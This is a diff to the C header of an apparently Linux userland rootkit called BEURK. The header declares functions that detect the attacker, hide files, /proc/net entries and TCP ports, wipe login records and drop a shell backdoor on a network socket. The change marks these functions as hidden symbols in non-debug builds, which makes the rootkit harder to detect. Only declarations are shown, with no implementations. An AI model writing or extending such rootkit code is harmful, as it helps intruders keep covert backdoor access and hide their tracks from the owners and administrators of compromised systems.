@@ -23,6 +23,12 @@
 #ifndef _BEURK_H_
 # define _BEURK_H_
 
+# if DEBUG_LEVEL > 0
+#  define INTERNAL_API(...)
+# else
+#  define INTERNAL_API __attribute__((visibility("hidden")))
+# endif
+
 # include <sys/socket.h> /* struct sockaddr */
 # include <stdio.h> /* FILE */
 
@@ -33,18 +39,18 @@ void        init(void) __attribute__((constructor));
 int         is_attacker(void);
 
 /* is_hidden_file.c */
-int         is_hidden_file(const char *path);
+int         is_hidden_file(const char *path) INTERNAL_API;
 
 /* is_procnet.c */
-int         is_procnet(const char *path);
+int         is_procnet(const char *path) INTERNAL_API;
 
 /* hide_tcp_ports  */
-FILE        *hide_tcp_ports(const char *file);
+FILE        *hide_tcp_ports(const char *file) INTERNAL_API;
 
 /* cleanup_login_records.c */
-void        cleanup_login_records(const char *pty_name);
+void        cleanup_login_records(const char *pty_name) INTERNAL_API;
 
 /* drop_shell_backdoor.c */
-int         drop_shell_backdoor(int sock, struct sockaddr *addr);
+int         drop_shell_backdoor(int sock, struct sockaddr *addr) INTERNAL_API;
 
 #endif /* _BEURK_H_ */
